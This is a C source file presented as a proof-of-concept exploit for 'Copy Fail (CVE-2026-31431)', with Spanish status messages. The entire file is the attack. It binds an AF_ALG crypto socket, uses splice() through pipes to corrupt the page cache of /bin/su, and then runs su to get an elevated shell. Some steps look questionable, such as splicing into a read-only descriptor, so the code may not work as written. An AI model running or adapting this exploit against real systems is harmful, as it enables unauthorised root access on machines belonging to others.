#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <string.h>

int main() {
    printf("[*] Iniciando PoC Copy Fail (CVE-2026-31431)...\n");
    
    int sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (sock < 0) { perror("[-] Error socket"); return 1; }

    struct sockaddr_alg sa = { .salg_family = AF_ALG };
    strcpy((char *)sa.salg_type, "aead");
    strcpy((char *)sa.salg_name, "authencesn(sha256,aes)");

    if (bind(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("[-] Error bind"); return 1;
    }
    int op_sock = accept(sock, NULL, NULL);

    int target_fd = open("/bin/su", O_RDONLY);
    int pipes[2];
    pipe(pipes);
    write(pipes[1], "\x00\x00\x00\x00", 4);

    printf("[*] Corrompiendo Page Cache de /bin/su vía splice()...\n");
    splice(pipes[0], NULL, op_sock, NULL, 4, 0);
    splice(op_sock, NULL, target_fd, NULL, 4, 0);

    printf("[+] Ataque completado. Ejecutando shell...\n");
    execl("/bin/su", "su", NULL);
    return 0;
}
